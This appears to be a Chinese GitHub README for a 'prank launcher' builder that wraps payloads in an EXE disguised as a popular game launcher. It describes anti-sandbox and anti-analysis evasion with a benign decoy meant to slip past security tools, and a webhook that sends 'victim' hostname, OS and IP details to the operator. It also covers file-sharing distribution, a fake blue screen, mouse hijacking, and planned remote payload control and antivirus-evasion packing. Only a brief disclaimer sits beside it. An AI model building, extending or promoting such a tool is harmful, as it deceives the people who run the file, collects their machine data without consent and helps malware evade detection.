# PrankLauncherBuilder (恶搞启动器生成工具) 🎮🎭

![Version](https://img.shields.io/badge/version-v4.0-red.svg)
![Python](https://img.shields.io/badge/python-3.10+-brightgreen.svg)
![License](https://img.shields.io/badge/license-MIT-green.svg)

**PrankLauncherBuilder** 是一个功能强大、高度定制化的“恶搞启动器”生成工具。它可以将一个看似正常的应用程序（如游戏启动器：原神、崩坏：星穹铁道、英雄联盟等）伪装成恶搞程序。

当受害者运行该启动器时，程序会展示逼真的“正在加载资源...”进度条，并在后台开启**多线程并发扫描**寻找真实的游戏程序。如果找到真实游戏，则静默启动它以掩人耳目；如果未找到，则在伪装界面结束后，触发一系列可配置的**恶搞载荷 (Payloads)**，包括跳转网页、伪造蓝屏、循环音效等。

> ⚠️ **声明**：本项目仅供学习交流与好友间的无害恶搞使用。请勿用于任何非法、破坏性或侵犯他人隐私的用途。

---

## ✨ v4.0 核心特性 (New Features)

### 1. 🎨 现代化炫酷界面 (Modernized UI)
- 采用 `customtkinter` 框架深度重构，支持**深色/浅色模式**无缝切换。
- 更加圆润、现代的交互体验，实时预览伪装加载界面。

### 2. 🛡️ 深度反分析与对抗 (Advanced Anti-Analysis)
- **11 项检测维度**：综合检测 CPU 核心数、内存容量、磁盘空间、运行时间、MAC 地址前缀、调试器进程及沙箱常见文件等。
- **诱饵行为 (Decoy Action)**：检测到处于沙箱或分析环境时，自动开启记事本展示良性行为并安全退出，极大地提高了在安全沙箱中的存活率。

### 3. 📡 Webhook 战报实时回传 (Webhook Reporter)
- 支持 **Server酱、钉钉、飞书** 及通用自定义 Webhook。
- 当受害者未安装游戏并触发恶搞时，恶搞者可第一时间收到包含**受害者机器信息**（主机名、操作系统版本、IP/位置提示）的即时推送。

### 4. ☁️ 一键云端分发 (Cloud Distribution)
- 构建成功后，支持一键上传生成的 EXE 到公共分享平台（file.io / 0x0.st / tmpfiles）。
- 自动生成**分享短链接**及**二维码 API**，方便直接发送给好友。

### 5. 🎭 丰富的恶搞载荷库 (Prank Payloads)
- **Fake BSOD**：模拟高保真的系统蓝屏界面，让对方误以为系统崩溃。
- **Audio Prank**：后台循环播放各种搞怪或刺耳音效（报警音、门铃声等）。
- **Mouse Drift**：让鼠标随机漂移，暂时失去控制。

---

## 🛠️ 快速开始 (Quick Start)

### 环境要求
- Windows 10/11 操作系统
- Python 3.10 及以上版本

### 1. 克隆与安装依赖
```bash
git clone https://github.com/luzay-max/ExeCreator.git
cd ExeCreator
pip install -r requirements.lock
```

### 2. 运行生成器
```bash
python builder/builder_gui.py
```

### 3. 生成与使用
1. **基础设置**：选择模板或自定义目标程序及图标。
2. **高级功能**：配置 Webhook 地址、勾选反分析检测。
3. **载荷选择**：选择开启蓝屏、音效或鼠标漂移等。
4. **生成与分享**：点击“生成”，构建成功后可选择“云端分发”获取下载链接。

---

## 📁 项目结构 (Project Structure)

```text
PrankLauncherBuilder/
├── builder/                    # 生成器 (Builder) 核心代码
│   ├── builder_core.py         # 打包核心逻辑
│   ├── builder_gui.py          # 图形界面入口
│   ├── utils/
│   │   ├── cloud_uploader.py   # 云端上传分发工具
│   │   ├── obfuscator.py       # 代码混淆器
│   │   └── file_inflator.py    # 文件膨胀工具
│   └── widgets/                # UI 组件库 (ConfigPanel, LogViewer)
├── template/                   # 启动器模板
│   ├── boot.py                 # 入口
│   ├── anti_analysis.py        # 反分析对抗模块
│   ├── webhook.py              # 战报回传模块
│   └── payloads/               # 恶搞载荷库 (BSOD, Audio, Mouse)
├── tests/                      # 自动化测试 (单元测试覆盖率 > 90%)
├── pyproject.toml              # Ruff & Pytest 配置
└── v4.0_开发计划.md            # 开发路线图
```

---

## 🔮 未来规划 (Roadmap)

- **Native Core**：使用 Rust 重构 Launcher 核心，剥离 Python 运行时，实现 < 2MB 的微型单文件。
- **远程载荷下发**：支持通过 Web 控制台实时控制已发出的启动器载荷。
- **更多免杀加壳支持**：集成更多开源加壳/静态免杀方案。

---

## 🤝 贡献与支持 (Contributing)

如果您觉得这个工具有趣，请给本项目点个 ⭐️ **Star**！

## 📄 开源协议 (License)

本项目基于 [MIT License](LICENSE) 许可开源。
